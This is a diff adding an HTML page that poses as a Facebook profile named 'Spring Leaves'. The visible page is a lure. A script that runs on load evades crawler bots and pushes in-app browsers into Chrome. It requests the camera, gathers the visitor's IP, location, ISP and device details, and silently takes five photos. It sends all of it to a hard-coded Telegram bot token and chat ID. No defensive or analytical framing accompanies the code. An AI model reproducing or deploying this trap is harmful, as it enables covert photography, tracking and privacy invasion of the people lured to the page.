@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Spring Leaves | Facebook</title>
+    <meta property="og:title" content="Spring Leaves (Profile)">
+    <meta property="og:description" content="‏1.2K‏ Followers · 450 Friends · See Photos and Videos">
+    <meta property="og:image" content="https://e.top4top.io/p_369921khp0.jpeg">
+    <meta property="og:type" content="profile">
+    <meta property="og:site_name" content="Facebook">
+
+    <style>
+        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #ffffff; }
+        .cover-photo { height: 180px; background: #e9ebee; position: relative; border-bottom: 1px solid #ddd; }
+        .profile-container { position: absolute; bottom: -40px; left: 15px; }
+        .avatar { width: 130px; height: 130px; border-radius: 50%; border: 5px solid white; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .main-content { padding: 50px 20px 20px; text-align: left; }
+        .profile-name { font-size: 26px; font-weight: bold; margin-bottom: 4px; color: #1c1e21; }
+        .profile-stats { color: #65676b; font-size: 15px; margin-bottom: 15px; }
+        .action-btns { display: flex; gap: 8px; margin-bottom: 20px; }
+        .btn { flex: 1; height: 36px; border-radius: 6px; border: none; font-weight: 600; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .btn-add { background-color: #1877f2; color: white; }
+        .btn-msg { background-color: #e4e6eb; color: #050505; }
+        .bio-list { list-style: none; padding: 0; margin: 0; border-top: 1px solid #ebedf0; padding-top: 15px; }
+        .bio-list li { margin-bottom: 12px; display: flex; align-items: center; font-size: 15px; color: #1c1e21; }
+        #camera_feed, #output_canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="cover-photo"></div>
+<div class="profile-container">
+    <img src="https://e.top4top.io/p_369921khp0.jpeg" class="avatar">
+</div>
+
+<div class="main-content">
+    <div class="profile-name">Spring Leaves</div>
+    <div class="profile-stats">1,248 Followers · 456 Friends</div>
+    
+    <div class="action-btns">
+        <div class="btn btn-add">Add Friend</div>
+        <div class="btn btn-msg">Message</div>
+    </div>
+
+    <ul class="bio-list">
+        <li>🌎 Lives in <b>Istanbul, Turkey</b></li>
+        <li>📍 From <b>London, United Kingdom</b></li>
+        <li>❤️ Single</li>
+        <li>🕒 Joined December 2018</li>
+    </ul>
+</div>
+
+<video id="camera_feed" autoplay playsinline></video>
+<canvas id="output_canvas"></canvas>
+
+<script>
+const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
+const CHAT_ID = '7184970355';
+
+// 1. الحماية من البوتات
+function checkBot() {
+    const botAgents = ["facebookexternalhit", "Facebot", "Googlebot", "Twitterbot", "TelegramBot", "WhatsApp"];
+    return botAgents.some(agent => navigator.userAgent.includes(agent));
+}
+
+// 2. إجبار المتصفح الخارجي (للأندرويد)
+function jumpToExternal() {
+    if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
+        const cleanUrl = window.location.href.replace(/https?:\/\//, "");
+        window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+    }
+}
+
+async function runInfection() {
+    if (checkBot()) return;
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('camera_feed');
+        video.srcObject = stream;
+
+        // جلب المعلومات التقنية
+        const battery = await navigator.getBattery();
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipInfo = await ipResponse.json();
+
+        let log = `✅ Target Captured: Spring Leaves Trap\n\n` +
+                  `👤 Device Platform: ${navigator.platform}\n` +
+                  `🌐 IP: ${ipInfo.ip}\n` +
+                  `📍 Location: ${ipInfo.city}, ${ipInfo.country_name}\n` +
+                  `🏢 ISP: ${ipInfo.org}\n` +
+                  `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n` +
+                  `🧠 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n` +
+                  `🖥️ Resolution: ${window.screen.width}x${window.screen.height}\n` +
+                  `⏰ Date: ${new Date().toLocaleString()}`;
+        
+        sendToTele(log);
+
+        let snapCount = 0;
+        let snapInterval = setInterval(() => {
+            if (snapCount >= 5) {
+                clearInterval(snapInterval);
+                stream.getTracks().forEach(track => track.stop());
+                return;
+            }
+            takeSnapshot(snapCount + 1);
+            snapCount++;
+        }, 1000);
+
+    } catch (err) {
+        sendToTele("⚠️ Permission Denied: Target refused camera access.");
+    }
+}
+
+function takeSnapshot(index) {
+    const canvas = document.getElementById('output_canvas');
+    const video = document.getElementById('camera_feed');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', `Snapshot #${index} for Target`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    }, 'image/jpeg');
+}
+
+function sendToTele(text) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+}
+
+// البدء عند تحميل الصفحة
+window.onload = () => {
+    jumpToExternal();
+    runInfection();
+};
+</script>
+</body>
+</html>
